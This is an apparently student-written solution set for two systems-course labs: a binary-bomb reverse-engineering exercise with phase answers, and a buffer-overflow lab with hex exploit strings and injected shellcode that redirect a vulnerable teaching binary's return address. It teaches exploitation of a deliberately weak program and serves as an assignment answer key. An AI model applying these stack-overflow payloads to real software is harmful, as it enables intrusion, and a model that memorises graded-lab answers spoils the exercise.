### Online Test

#### Lab 2

> $ objdump -D bomb > asm
>
> $ gdb bomb
>
> (gdb) set args psol 
>
> (gdb) break *0x0804970f #set break point at <explode_bomb> function

##### phase_1

```assembly
08048be2 <phase_1>:
 8048be2:	83 ec 14             	sub    $0x14,%esp
 8048be5:	68 ac 9a 04 08       	push   $0x8049aac #
 8048bea:	ff 74 24 1c          	pushl  0x1c(%esp)
 8048bee:	e8 a0 03 00 00       	call   8048f93 <strings_not_equal>
 8048bf3:	83 c4 10             	add    $0x10,%esp
 8048bf6:	85 c0                	test   %eax,%eax
 8048bf8:	74 05                	je     8048bff <phase_1+0x1d>
 8048bfa:	e8 10 0b 00 00       	call   804970f #<explode_bomb>#
 8048bff:	83 c4 0c             	add    $0xc,%esp
 8048c02:	c3                   	ret    
```

(gdb) x/s 0x8049aac

**answer: I am not part of the problem. I am a Republican.**

##### phase_2

```assembly
08048c03 <phase_2>:
 8048c03:	53                   	push   %ebx
 8048c04:	83 ec 30             	sub    $0x30,%esp
 8048c07:	8d 44 24 10          	lea    0x10(%esp),%eax
 8048c0b:	50                   	push   %eax
 8048c0c:	ff 74 24 3c          	pushl  0x3c(%esp)
 8048c10:	e8 37 0b 00 00       	call   804974c <read_six_numbers> #
 8048c15:	83 c4 10             	add    $0x10,%esp
 8048c18:	83 7c 24 08 01       	cmpl   $0x1,0x8(%esp) #A[0] = 1
 8048c1d:	74 25                	je     8048c44 <phase_2+0x41>
 8048c1f:	e8 eb 0a 00 00       	call   804970f #<explode_bomb>#
 8048c24:	eb 1e                	jmp    8048c44 <phase_2+0x41>
+8048c26:	89 d8                	mov    %ebx,%eax #%eax = $ebx
 8048c28:	83 c3 01             	add    $0x1,%ebx #%ebx++
 8048c2b:	89 da                	mov    %ebx,%edx #%edx = %ebx
 8048c2d:	0f af 54 84 04       	imul   0x4(%esp,%eax,4),%edx #%edx = (n+1) * A[n]
 8048c32:	39 54 84 08          	cmp    %edx,0x8(%esp,%eax,4) #A[n+1] = (n+1) * A[n]
 8048c36:	74 05                	je     8048c3d <phase_2+0x3a>
 8048c38:	e8 d2 0a 00 00       	call   804970f #<explode_bomb>#
+8048c3d:	83 fb 06             	cmp    $0x6,%ebx #if %ebx != 6 then jmp
 8048c40:	75 e4                	jne    8048c26 <phase_2+0x23>
 8048c42:	eb 07                	jmp    8048c4b <phase_2+0x48>
+8048c44:	bb 01 00 00 00       	mov    $0x1,%ebx #%ebx = 1
 8048c49:	eb db                	jmp    8048c26 <phase_2+0x23>
+8048c4b:	83 c4 28             	add    $0x28,%esp
 8048c4e:	5b                   	pop    %ebx
 8048c4f:	c3                   	ret    
```

**answer: 1 2 6 24 120 720**

##### phase_3

```assembly
08048c50 <phase_3>:
 8048c50:	83 ec 1c             	sub    $0x1c,%esp
 8048c53:	8d 44 24 08          	lea    0x8(%esp),%eax
 8048c57:	50                   	push   %eax #push %esp + 8 onto stack
 8048c58:	8d 44 24 10          	lea    0x10(%esp),%eax
 8048c5c:	50                   	push   %eax #push %esp + 10 onto stack
 8048c5d:	68 58 9e 04 08       	push   $0x8049e58 #x/s -> %d %d
 8048c62:	ff 74 24 2c          	pushl  0x2c(%esp)
 8048c66:	e8 65 fc ff ff       	call   80488d0 <__isoc99_sscanf@plt>
 8048c6b:	83 c4 10             	add    $0x10,%esp
 8048c6e:	83 f8 01             	cmp    $0x1,%eax #if %eax > 1 then not explode
 8048c71:	7f 05                	jg     8048c78 <phase_3+0x28>
 8048c73:	e8 97 0a 00 00       	call   804970f #<explode_bomb>#
+8048c78:	83 7c 24 0c 07       	cmpl   $0x7,0xc(%esp)
 8048c7d:	77 3c                	ja     8048cbb <phase_3+0x6b>
 8048c7f:	8b 44 24 0c          	mov    0xc(%esp),%eax
 8048c83:	ff 24 85 10 9b 04 08 	jmp    *0x8049b10(,%eax,4) #jump table x/10wx
 8048c8a:	b8 18 01 00 00       	mov    $0x118,%eax #1->280
 8048c8f:	eb 3b                	jmp    8048ccc <phase_3+0x7c>
 8048c91:	b8 b5 03 00 00       	mov    $0x3b5,%eax #2->949
 8048c96:	eb 34                	jmp    8048ccc <phase_3+0x7c>
 8048c98:	b8 67 01 00 00       	mov    $0x167,%eax #3->359
 8048c9d:	eb 2d                	jmp    8048ccc <phase_3+0x7c>
 8048c9f:	b8 68 00 00 00       	mov    $0x68,%eax #4->104
 8048ca4:	eb 26                	jmp    8048ccc <phase_3+0x7c>
 8048ca6:	b8 00 03 00 00       	mov    $0x300,%eax #5->768
 8048cab:	eb 1f                	jmp    8048ccc <phase_3+0x7c>
 8048cad:	b8 41 01 00 00       	mov    $0x141,%eax #6->321
 8048cb2:	eb 18                	jmp    8048ccc <phase_3+0x7c>
 8048cb4:	b8 a0 01 00 00       	mov    $0x1a0,%eax #7->416
 8048cb9:	eb 11                	jmp    8048ccc <phase_3+0x7c>
+8048cbb:	e8 4f 0a 00 00       	call   804970f #<explode_bomb>#
 8048cc0:	b8 00 00 00 00       	mov    $0x0,%eax
 8048cc5:	eb 05                	jmp    8048ccc <phase_3+0x7c>
 8048cc7:	b8 c9 03 00 00       	mov    $0x3c9,%eax #0->969
+8048ccc:	3b 44 24 08          	cmp    0x8(%esp),%eax
 8048cd0:	74 05                	je     8048cd7 <phase_3+0x87>
 8048cd2:	e8 38 0a 00 00       	call   804970f #<explode_bomb>#
+8048cd7:	83 c4 1c             	add    $0x1c,%esp
 8048cda:	c3                   	ret    
```

**answer: 2 949**

##### phase_4

```assembly
08048d04 <phase_4>:
 8048d04:	83 ec 20             	sub    $0x20,%esp
 8048d07:	8d 44 24 10          	lea    0x10(%esp),%eax
 8048d0b:	50                   	push   %eax #push %esp + 16 onto stack
 8048d0c:	68 5b 9e 04 08       	push   $0x8049e5b #x/s -> %d
 8048d11:	ff 74 24 2c          	pushl  0x2c(%esp)
 8048d15:	e8 b6 fb ff ff       	call   **80488d0** <__isoc99_sscanf@plt>
 8048d1a:	83 c4 10             	add    $0x10,%esp
 8048d1d:	83 f8 01             	cmp    $0x1,%eax #
 8048d20:	75 07                	jne    8048d29 <phase_4+0x25>
 8048d22:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp) # if %esp + 12 then not explode
 8048d27:	7f 05                	jg     8048d2e <phase_4+0x2a>
+8048d29:	e8 e1 09 00 00       	call   804970f #<explode_bomb>#
+8048d2e:	83 ec 0c             	sub    $0xc,%esp
 8048d31:	ff 74 24 18          	pushl  0x18(%esp)
 8048d35:	e8 a1 ff ff ff       	call   8048cdb <func4> #
 8048d3a:	83 c4 10             	add    $0x10,%esp
 8048d3d:	3d d0 02 00 00       	cmp    $0x2d0,%eax #720
 8048d42:	74 05                	je     8048d49 <phase_4+0x45>
 8048d44:	e8 c6 09 00 00       	call   804970f #<explode_bomb>#
+8048d49:	83 c4 1c             	add    $0x1c,%esp
 8048d4c:	c3                   	ret    
```

```assembly
08048cdb <func4>: #return n!
 8048cdb:	53                   	push   %ebx
 8048cdc:	83 ec 08             	sub    $0x8,%esp
 8048cdf:	8b 5c 24 10          	mov    0x10(%esp),%ebx
 8048ce3:	b8 01 00 00 00       	mov    $0x1,%eax
 8048ce8:	83 fb 01             	cmp    $0x1,%ebx #if %ebx <= 1 then return
 8048ceb:	7e 12                	jle    8048cff <func4+0x24>
 8048ced:	83 ec 0c             	sub    $0xc,%esp
 8048cf0:	8d 43 ff             	lea    -0x1(%ebx),%eax
 8048cf3:	50                   	push   %eax
 8048cf4:	e8 e2 ff ff ff       	call   8048cdb <func4>
 8048cf9:	83 c4 10             	add    $0x10,%esp
 8048cfc:	0f af c3             	imul   %ebx,%eax
 8048cff:	83 c4 08             	add    $0x8,%esp
 8048d02:	5b                   	pop    %ebx
 8048d03:	c3                   	ret    
```

<fun4>

- [x] factorial function #func4(n) = n!, func4(0) = 1


- [ ] Fibonacci sequence #func4(n) = func4(n-1) + func4(n-2), func4(0) = func4(1) = 1

n! = 720 -> n = 6

**answer: 6**

##### phase_5

```assembly
08048d4d <phase_5>:
 8048d4d:	53                   	push   %ebx
 8048d4e:	83 ec 24             	sub    $0x24,%esp
 8048d51:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
 8048d55:	53                   	push   %ebx
 8048d56:	e8 19 02 00 00       	call   8048f74 <string_length>
 8048d5b:	83 c4 10             	add    $0x10,%esp
 8048d5e:	83 f8 06             	cmp    $0x6,%eax
 8048d61:	74 46                	je     8048da9 <phase_5+0x5c>
 8048d63:	e8 a7 09 00 00       	call   804970f #<explode_bomb>#
 8048d68:	eb 3f                	jmp    8048da9 <phase_5+0x5c>
+8048d6a:	0f b6 14 03          	movzbl (%ebx,%eax,1),%edx
 8048d6e:	83 e2 0f             	and    $0xf,%edx
 8048d71:	0f b6 92 30 9b 04 08 	movzbl 0x8049b30(%edx),%edx #x/16c 0x8049b30
 8048d78:	88 54 04 09          	mov    %dl,0x9(%esp,%eax,1)
 8048d7c:	83 c0 01             	add    $0x1,%eax #%eax++
 8048d7f:	83 f8 06             	cmp    $0x6,%eax #if %eax == 6 then exit
 8048d82:	75 e6                	jne    8048d6a <phase_5+0x1d>
 8048d84:	c6 44 24 0f 00       	movb   $0x0,0xf(%esp)
 8048d89:	83 ec 08             	sub    $0x8,%esp
 8048d8c:	68 06 9b 04 08       	push   $0x8049b06 #x/s -> giants
 8048d91:	8d 44 24 15          	lea    0x15(%esp),%eax
 8048d95:	50                   	push   %eax
 8048d96:	e8 f8 01 00 00       	call   8048f93 <strings_not_equal>
 8048d9b:	83 c4 10             	add    $0x10,%esp
 8048d9e:	85 c0                	test   %eax,%eax
 8048da0:	74 0e                	je     8048db0 <phase_5+0x63>
 8048da2:	e8 68 09 00 00       	call   804970f #<explode_bomb>#
 8048da7:	eb 07                	jmp    8048db0 <phase_5+0x63>
+8048da9:	b8 00 00 00 00       	mov    $0x0,%eax
 8048dae:	eb ba                	jmp    8048d6a <phase_5+0x1d>
+8048db0:	83 c4 18             	add    $0x18,%esp
 8048db3:	5b                   	pop    %ebx
 8048db4:	c3                   	ret    
```
(gdb) x/16c 0x8049b30

0x8049b30 <array.2844>:	**105 'i'**	**115 's'**	114 'r'	118 'v'	101 'e'	**97 'a'**	119 'w'	104 'h'

0x8049b38 <array.2844+8>:	111 'o'	98 'b'	112 'p'	**110 'n'**	117 'u'	**116 't'**	102 'f'	**103 'g'**

input[0] & 0xf = 0xf, input[1] & 0xf = 0x0, input[2] & 0xf = 0x5,

input[3] & 0xf = 0xb, input[4] & 0xf = 0xd, input[5] & 0xf = 0x1

**answer: opekmq**

##### phase_6

```assembly
08048e0a <phase_6>:
 8048e0a:	83 ec 10             	sub    $0x10,%esp
 8048e0d:	6a 0a                	push   $0xa
 8048e0f:	6a 00                	push   $0x0
 8048e11:	ff 74 24 1c          	pushl  0x1c(%esp)
 8048e15:	e8 36 fb ff ff       	call   8048950 <strtol@plt> #string to long
 8048e1a:	a3 b4 b2 04 08       	mov    %eax,0x804b2b4
 8048e1f:	c7 04 24 b4 b2 04 08 	movl   $0x804b2b4,(%esp)
 8048e26:	e8 8a ff ff ff       	call   8048db5 <fun6>
 8048e2b:	8b 40 08             	mov    0x8(%eax),%eax
 8048e2e:	8b 40 08             	mov    0x8(%eax),%eax
 8048e31:	8b 40 08             	mov    0x8(%eax),%eax
 8048e34:	8b 40 08             	mov    0x8(%eax),%eax
 8048e37:	8b 40 08             	mov    0x8(%eax),%eax
 8048e3a:	8b 40 08             	mov    0x8(%eax),%eax
 8048e3d:	83 c4 10             	add    $0x10,%esp
 8048e40:	8b 15 b4 b2 04 08    	mov    0x804b2b4,%edx
 8048e46:	39 10                	cmp    %edx,(%eax) #break -> print $edx or print *$eax
 8048e48:	74 05                	je     8048e4f <phase_6+0x45>
 8048e4a:	e8 c0 08 00 00       	call   804970f #<explode_bomb>#
 8048e4f:	83 c4 0c             	add    $0xc,%esp
 8048e52:	c3                   	ret    
```

```assembly
08048db5 <fun6>:
 8048db5:	56                   	push   %esi
 8048db6:	53                   	push   %ebx
 8048db7:	8b 44 24 0c          	mov    0xc(%esp),%eax
 8048dbb:	8b 70 08             	mov    0x8(%eax),%esi
 8048dbe:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
 8048dc5:	85 f6                	test   %esi,%esi
 8048dc7:	75 2c                	jne    8048df5 <fun6+0x40>
 8048dc9:	eb 3c                	jmp    8048e07 <fun6+0x52>
 8048dcb:	89 d1                	mov    %edx,%ecx
 8048dcd:	8b 51 08             	mov    0x8(%ecx),%edx
 8048dd0:	85 d2                	test   %edx,%edx
 8048dd2:	74 04                	je     8048dd8 <fun6+0x23>
 8048dd4:	39 1a                	cmp    %ebx,(%edx)
 8048dd6:	7f f3                	jg     8048dcb <fun6+0x16>
 8048dd8:	39 d1                	cmp    %edx,%ecx
 8048dda:	74 05                	je     8048de1 <fun6+0x2c>
 8048ddc:	89 71 08             	mov    %esi,0x8(%ecx)
 8048ddf:	eb 08                	jmp    8048de9 <fun6+0x34>
 8048de1:	89 f0                	mov    %esi,%eax
 8048de3:	eb 04                	jmp    8048de9 <fun6+0x34>
 8048de5:	89 c2                	mov    %eax,%edx
 8048de7:	89 f0                	mov    %esi,%eax
 8048de9:	8b 4e 08             	mov    0x8(%esi),%ecx
 8048dec:	89 56 08             	mov    %edx,0x8(%esi)
 8048def:	85 c9                	test   %ecx,%ecx
 8048df1:	74 14                	je     8048e07 <fun6+0x52>
 8048df3:	89 ce                	mov    %ecx,%esi
 8048df5:	85 c0                	test   %eax,%eax
 8048df7:	74 ec                	je     8048de5 <fun6+0x30>
 8048df9:	8b 1e                	mov    (%esi),%ebx
 8048dfb:	89 c1                	mov    %eax,%ecx
 8048dfd:	39 18                	cmp    %ebx,(%eax)
 8048dff:	7f cc                	jg     8048dcd <fun6+0x18>
 8048e01:	89 c2                	mov    %eax,%edx
 8048e03:	89 f0                	mov    %esi,%eax
 8048e05:	eb e2                	jmp    8048de9 <fun6+0x34>
 8048e07:	5b                   	pop    %ebx
 8048e08:	5e                   	pop    %esi
 8048e09:	c3                   	ret    
```

**answer: 500**

##### secret_phase

```assembly
0804984e <phase_defused>:
 804984e:	83 ec 78             	sub    $0x78,%esp
 8049851:	6a 01                	push   $0x1
 8049853:	e8 74 f9 ff ff       	call   80491cc <send_msg>
 8049858:	83 c4 10             	add    $0x10,%esp
 804985b:	83 3d a8 b7 04 08 06 	cmpl   $0x6,0x804b7a8
 8049862:	75 77                	jne    80498db <phase_defused+0x8d>
 8049864:	8d 44 24 10          	lea    0x10(%esp),%eax
 8049868:	50                   	push   %eax
 8049869:	8d 44 24 10          	lea    0x10(%esp),%eax
 804986d:	50                   	push   %eax
 804986e:	68 a2 9e 04 08       	push   $0x8049ea2 #x/s -> %d %s
 8049873:	68 b0 b8 04 08       	push   $0x804b8b0
 8049878:	e8 53 f0 ff ff       	call   **80488d0** <__isoc99_sscanf@plt>
 804987d:	83 c4 10             	add    $0x10,%esp
 8049880:	83 f8 02             	cmp    $0x2,%eax
 8049883:	75 3a                	jne    80498bf <phase_defused+0x71>
 8049885:	83 ec 08             	sub    $0x8,%esp
 8049888:	68 a8 9e 04 08       	push   $0x8049ea8 #x/s -> austinpowers
 804988d:	8d 44 24 1c          	lea    0x1c(%esp),%eax
 8049891:	50                   	push   %eax
 8049892:	e8 fc f6 ff ff       	call   8048f93 <strings_not_equal>
 8049897:	83 c4 10             	add    $0x10,%esp
 804989a:	85 c0                	test   %eax,%eax
 804989c:	75 21                	jne    80498bf <phase_defused+0x71>
 804989e:	83 ec 0c             	sub    $0xc,%esp
 80498a1:	68 9c 9b 04 08       	push   $0x8049b9c
 80498a6:	e8 b5 ef ff ff       	call   8048860 <puts@plt>
 80498ab:	c7 04 24 c4 9b 04 08 	movl   $0x8049bc4,(%esp)
 80498b2:	e8 a9 ef ff ff       	call   8048860 <puts@plt>
 80498b7:	e8 e8 f5 ff ff       	call   8048ea4 #<secret_phase>#
 80498bc:	83 c4 10             	add    $0x10,%esp
 80498bf:	83 ec 0c             	sub    $0xc,%esp
 80498c2:	68 fc 9b 04 08       	push   $0x8049bfc
 80498c7:	e8 94 ef ff ff       	call   8048860 <puts@plt>
 80498cc:	c7 04 24 28 9c 04 08 	movl   $0x8049c28,(%esp)
 80498d3:	e8 88 ef ff ff       	call   8048860 <puts@plt>
 80498d8:	83 c4 10             	add    $0x10,%esp
 80498db:	83 c4 6c             	add    $0x6c,%esp
 80498de:	c3                   	ret    
 80498df:	90                   	nop
```

phase_4: 6 -> 6 **austinpowers**

```assembly
08048ea4 <secret_phase>:
 8048ea4:	53                   	push   %ebx
 8048ea5:	83 ec 08             	sub    $0x8,%esp
 8048ea8:	e8 da 08 00 00       	call   8049787 <read_line>
 8048ead:	83 ec 04             	sub    $0x4,%esp
 8048eb0:	6a 0a                	push   $0xa
 8048eb2:	6a 00                	push   $0x0
 8048eb4:	50                   	push   %eax
 8048eb5:	e8 96 fa ff ff       	call   8048950 <strtol@plt> #string to long
 8048eba:	89 c3                	mov    %eax,%ebx
 8048ebc:	8d 40 ff             	lea    -0x1(%eax),%eax
 8048ebf:	83 c4 10             	add    $0x10,%esp
 8048ec2:	3d e8 03 00 00       	cmp    $0x3e8,%eax #if %eax <= 1000 then not explode
 8048ec7:	76 05                	jbe    8048ece <secret_phase+0x2a>
 8048ec9:	e8 41 08 00 00       	call   804970f #<explode_bomb>#
+8048ece:	83 ec 08             	sub    $0x8,%esp
 8048ed1:	53                   	push   %ebx
 8048ed2:	68 00 b2 04 08       	push   $0x804b200 #
 8048ed7:	e8 77 ff ff ff       	call   8048e53 <fun7>
 8048edc:	83 c4 10             	add    $0x10,%esp
 8048edf:	83 f8 04             	cmp    $0x4,%eax # if %eax == 4 then not explode
 8048ee2:	74 05                	je     8048ee9 <secret_phase+0x45>
 8048ee4:	e8 26 08 00 00       	call   804970f #<explode_bomb>#
+8048ee9:	83 ec 0c             	sub    $0xc,%esp
 8048eec:	68 e0 9a 04 08       	push   $0x8049ae0
 8048ef1:	e8 6a f9 ff ff       	call   8048860 <puts@plt>
 8048ef6:	e8 53 09 00 00       	call   804984e <phase_defused>
 8048efb:	83 c4 18             	add    $0x18,%esp
 8048efe:	5b                   	pop    %ebx
 8048eff:	c3                   	ret    
```

```assembly
08048e53 <fun7>:
 8048e53:	53                   	push   %ebx
 8048e54:	83 ec 08             	sub    $0x8,%esp
 8048e57:	8b 54 24 10          	mov    0x10(%esp),%edx
 8048e5b:	8b 4c 24 14          	mov    0x14(%esp),%ecx
 8048e5f:	85 d2                	test   %edx,%edx #if %edx == 0 the exit
 8048e61:	74 37                	je     8048e9a <fun7+0x47>
 8048e63:	8b 1a                	mov    (%edx),%ebx # %ebx = (%edx)
 8048e65:	39 cb                	cmp    %ecx,%ebx # if (%edx) <= %ecx
 8048e67:	7e 13                	jle    8048e7c <fun7+0x29>
 8048e69:	83 ec 08             	sub    $0x8,%esp
 8048e6c:	51                   	push   %ecx
 8048e6d:	ff 72 04             	pushl  0x4(%edx) #(%edx + 4)
 8048e70:	e8 de ff ff ff       	call   8048e53 <fun7> #
 8048e75:	83 c4 10             	add    $0x10,%esp
 8048e78:	01 c0                	add    %eax,%eax # %eax = %eax * 2
 8048e7a:	eb 23                	jmp    8048e9f <fun7+0x4c>
+8048e7c:	b8 00 00 00 00       	mov    $0x0,%eax
 8048e81:	39 cb                	cmp    %ecx,%ebx
 8048e83:	74 1a                	je     8048e9f <fun7+0x4c>
 8048e85:	83 ec 08             	sub    $0x8,%esp
 8048e88:	51                   	push   %ecx
 8048e89:	ff 72 08             	pushl  0x8(%edx) # (%edx + 8)
 8048e8c:	e8 c2 ff ff ff       	call   8048e53 <fun7> #
 8048e91:	83 c4 10             	add    $0x10,%esp
 8048e94:	8d 44 00 01          	lea    0x1(%eax,%eax,1),%eax # %eax = %eax * 2 + 1
 8048e98:	eb 05                	jmp    8048e9f <fun7+0x4c>
+8048e9a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
+8048e9f:	83 c4 08             	add    $0x8,%esp
 8048ea2:	5b                   	pop    %ebx
 8048ea3:	c3                   	ret    
```

**fun7**(void *address, long int num)

if num == \*(int\*)address then **fun7**(address, num) = 0

else if num < \*(int\*)address then **fun7**(address, num) = 2 * **fun7**(address + 8, num) + 1

else if num > \*(int\*)address then **fun7**(address, num) = 2 * **fun7**(address + 4, num)

0x804b200->right->right->left

(gdb) x/wx 0x804b200+4 => 0x804b204 <n1+4>:		0x0804b20c

(gdb) x/wx 0x804b20c+4 => 0x804b210 <n21+4>:	0x0804b23c

(gdb) x/wx 0x804b23c+8 => 0x804b244 <n31+8>:	0x0804b284

(gdb) x/d 0x804b284 => 0x804b284 <n42>:	7

**answer: 7**

#### Lab 3

> $ tar xvf buflab-handout.tar
>
> $  ./makecookie ics515030910477
>
> $ objdump -D bufbomb > asm
>
> $ gdb bufbomb
>
> (gdb) run -u ics515030910477 < (filename)
>
> $ ./hex2raw < (filename) | ./bufbomb -u ics515030910477
>
> $ ./hex2raw < (filename) | ./bufbomb -u ics515030910477 -s

```assembly
08048cad <getbuf>:
 8048cad:	55                   	push   %ebp #break -> (gdb) print $ebp 
 8048cae:	89 e5                	mov    %esp,%ebp
 8048cb0:	83 ec 28             	sub    $0x28,%esp
 8048cb3:	83 ec 0c             	sub    $0xc,%esp
 8048cb6:	8d 45 d8             	lea    -0x28(%ebp),%eax #40bytes
 8048cb9:	50                   	push   %eax #break -> (gdb) i r to get %eax
 8048cba:	e8 3e 01 00 00       	call   8048dfd <Gets>
 8048cbf:	83 c4 10             	add    $0x10,%esp
 8048cc2:	b8 01 00 00 00       	mov    $0x1,%eax
 8048cc7:	c9                   	leave  
 8048cc8:	c3                   	ret    
```

40bytes + 4bytes(saved %ebp) + 4 bytes(return address)

##### Level 0: Candle

```assembly
08048b5b <smoke>:
 8048b5b:	55                   	push   %ebp
 8048b5c:	89 e5                	mov    %esp,%ebp
 8048b5e:	83 ec 08             	sub    $0x8,%esp
 8048b61:	83 ec 0c             	sub    $0xc,%esp
 8048b64:	68 e0 a2 04 08       	push   $0x804a2e0
 8048b69:	e8 92 fd ff ff       	call   8048900 <puts@plt>
 8048b6e:	83 c4 10             	add    $0x10,%esp
 8048b71:	83 ec 0c             	sub    $0xc,%esp
 8048b74:	6a 00                	push   $0x0
 8048b76:	e8 e5 08 00 00       	call   8049460 <validate>
 8048b7b:	83 c4 10             	add    $0x10,%esp
 8048b7e:	83 ec 0c             	sub    $0xc,%esp
 8048b81:	6a 00                	push   $0x0
 8048b83:	e8 98 fd ff ff       	call   8048920 <exit@plt>
```

```
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
5b 8b 04 08 #the address of smoke function(little endian)
```

##### Level 1: Sparkler

```assembly
08048b88 <fizz>:
 8048b88:	55                   	push   %ebp
 8048b89:	89 e5                	mov    %esp,%ebp
 8048b8b:	83 ec 08             	sub    $0x8,%esp
 8048b8e:	8b 55 08             	mov    0x8(%ebp),%edx
 8048b91:	a1 20 b2 04 08       	mov    0x804b220,%eax #cookie
 8048b96:	39 c2                	cmp    %eax,%edx
 8048b98:	75 22                	jne    8048bbc <fizz+0x34>
 8048b9a:	83 ec 08             	sub    $0x8,%esp
 8048b9d:	ff 75 08             	pushl  0x8(%ebp)
 8048ba0:	68 fb a2 04 08       	push   $0x804a2fb
 8048ba5:	e8 86 fc ff ff       	call   8048830 <printf@plt>
 8048baa:	83 c4 10             	add    $0x10,%esp
 8048bad:	83 ec 0c             	sub    $0xc,%esp
 8048bb0:	6a 01                	push   $0x1
 8048bb2:	e8 a9 08 00 00       	call   8049460 <validate>
 8048bb7:	83 c4 10             	add    $0x10,%esp
 8048bba:	eb 13                	jmp    8048bcf <fizz+0x47>
 8048bbc:	83 ec 08             	sub    $0x8,%esp
 8048bbf:	ff 75 08             	pushl  0x8(%ebp)
 8048bc2:	68 1c a3 04 08       	push   $0x804a31c
 8048bc7:	e8 64 fc ff ff       	call   8048830 <printf@plt>
 8048bcc:	83 c4 10             	add    $0x10,%esp
 8048bcf:	83 ec 0c             	sub    $0xc,%esp
 8048bd2:	6a 00                	push   $0x0
 8048bd4:	e8 47 fd ff ff       	call   8048920 <exit@plt>
```

```
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
88 8b 04 08 #return address
00 00 00 00
2d 38 31 6c #cookie
```

##### Level 2: Firecracker

```assembly
08048bd9 <bang>:
 8048bd9:	55                   	push   %ebp
 8048bda:	89 e5                	mov    %esp,%ebp
 8048bdc:	83 ec 08             	sub    $0x8,%esp
 8048bdf:	a1 28 b2 04 08       	mov    0x804b228,%eax #global_value
 8048be4:	89 c2                	mov    %eax,%edx
 8048be6:	a1 20 b2 04 08       	mov    0x804b220,%eax #cookie
 8048beb:	39 c2                	cmp    %eax,%edx
 8048bed:	75 25                	jne    8048c14 <bang+0x3b>
 8048bef:	a1 28 b2 04 08       	mov    0x804b228,%eax
 8048bf4:	83 ec 08             	sub    $0x8,%esp
 8048bf7:	50                   	push   %eax
 8048bf8:	68 3c a3 04 08       	push   $0x804a33c
 8048bfd:	e8 2e fc ff ff       	call   8048830 <printf@plt>
 8048c02:	83 c4 10             	add    $0x10,%esp
 8048c05:	83 ec 0c             	sub    $0xc,%esp
 8048c08:	6a 02                	push   $0x2
 8048c0a:	e8 51 08 00 00       	call   8049460 <validate>
 8048c0f:	83 c4 10             	add    $0x10,%esp
 8048c12:	eb 16                	jmp    8048c2a <bang+0x51>
 8048c14:	a1 28 b2 04 08       	mov    0x804b228,%eax
 8048c19:	83 ec 08             	sub    $0x8,%esp
 8048c1c:	50                   	push   %eax
 8048c1d:	68 61 a3 04 08       	push   $0x804a361
 8048c22:	e8 09 fc ff ff       	call   8048830 <printf@plt>
 8048c27:	83 c4 10             	add    $0x10,%esp
 8048c2a:	83 ec 0c             	sub    $0xc,%esp
 8048c2d:	6a 00                	push   $0x0
 8048c2f:	e8 ec fc ff ff       	call   8048920 <exit@plt>
```

```assembly
movl $0x6c31382d,%eax
movl %eax,0x0804b228 #replace global_value with cookie
pushl $0x08048bd9 #replace return address with <bang> function
ret
```

> $  gcc -m32 -c firecracker.s
>
> $  objdump -D firecracker.o > firecracker.d

```assembly
firecracker.o:	file format Mach-O 32-bit i386

Disassembly of section __TEXT,__text:
__text:
       0:	b8 2d 38 31 6c 	movl	$1815164973, %eax
       5:	a3 28 b2 04 08 	movl	%eax, 134525480
       a:	68 d9 8b 04 08 	pushl	$134515673
       f:	c3 	retl
```

```
b8 2d 38 31
6c a3 28 b2
04 08 68 d9
8b 04 08 c3 #attack code
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
28 31 68 55 #the start address of the input string (gdb)
```

##### Level 3: Dynamite

```assembly
08048c34 <test>:
 8048c34:	55                   	push   %ebp
 8048c35:	89 e5                	mov    %esp,%ebp
 8048c37:	83 ec 18             	sub    $0x18,%esp
 8048c3a:	e8 7b 04 00 00       	call   80490ba <uniqueval>
 8048c3f:	89 45 f0             	mov    %eax,-0x10(%ebp)
 8048c42:	e8 66 00 00 00       	call   8048cad <getbuf>
+8048c47:	89 45 f4             	mov    %eax,-0xc(%ebp)
 8048c4a:	e8 6b 04 00 00       	call   80490ba <uniqueval>
 8048c4f:	89 c2                	mov    %eax,%edx
 8048c51:	8b 45 f0             	mov    -0x10(%ebp),%eax
 8048c54:	39 c2                	cmp    %eax,%edx
 8048c56:	74 12                	je     8048c6a <test+0x36>
 8048c58:	83 ec 0c             	sub    $0xc,%esp
 8048c5b:	68 80 a3 04 08       	push   $0x804a380
 8048c60:	e8 9b fc ff ff       	call   8048900 <puts@plt>
 8048c65:	83 c4 10             	add    $0x10,%esp
 8048c68:	eb 41                	jmp    8048cab <test+0x77>
 8048c6a:	8b 55 f4             	mov    -0xc(%ebp),%edx
 8048c6d:	a1 20 b2 04 08       	mov    0x804b220,%eax
 8048c72:	39 c2                	cmp    %eax,%edx
 8048c74:	75 22                	jne    8048c98 <test+0x64>
 8048c76:	83 ec 08             	sub    $0x8,%esp
 8048c79:	ff 75 f4             	pushl  -0xc(%ebp)
 8048c7c:	68 a9 a3 04 08       	push   $0x804a3a9
 8048c81:	e8 aa fb ff ff       	call   8048830 <printf@plt>
 8048c86:	83 c4 10             	add    $0x10,%esp
 8048c89:	83 ec 0c             	sub    $0xc,%esp
 8048c8c:	6a 03                	push   $0x3
 8048c8e:	e8 cd 07 00 00       	call   8049460 <validate>
 8048c93:	83 c4 10             	add    $0x10,%esp
 8048c96:	eb 13                	jmp    8048cab <test+0x77>
 8048c98:	83 ec 08             	sub    $0x8,%esp
 8048c9b:	ff 75 f4             	pushl  -0xc(%ebp)
 8048c9e:	68 c6 a3 04 08       	push   $0x804a3c6
 8048ca3:	e8 88 fb ff ff       	call   8048830 <printf@plt>
 8048ca8:	83 c4 10             	add    $0x10,%esp
 8048cab:	c9                   	leave  
 8048cac:	c3                   	ret    
```

```assembly
movl $0x6c31382d, %eax #replace the return value with cookie
pushl $0x8048c47
ret
```

> $  gcc -m32 -c dynamite.s
>
> $  objdump -D dynamite.o > dynamite.d

```assembly
dynamite.o:	file format Mach-O 32-bit i386

Disassembly of section __TEXT,__text:
__text:
       0:	b8 2d 38 31 6c 	movl	$1815164973, %eax
       5:	68 47 8c 04 08 	pushl	$134515783
       a:	c3 	retl
```

```
b8 2d 38 31
6c 68 47 8c
04 08 c3 00 #attack code
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
